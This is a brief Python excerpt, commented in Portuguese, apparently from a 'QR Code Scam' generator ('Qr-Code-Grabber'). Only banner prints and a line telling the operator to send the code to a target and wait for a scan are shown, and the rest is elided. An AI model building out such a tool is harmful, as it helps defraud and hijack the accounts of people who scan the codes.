# CODIFICADO POR: TZ | https://instagram.com/tzfofo
...
def main():
    print('github.com/Tzputao/Qr-Code-Grabber\n')
    print('** QR Code Scam Gerador **')
    ...
    print('Envie o QR Code para o usuário e digitalize. Espera..')
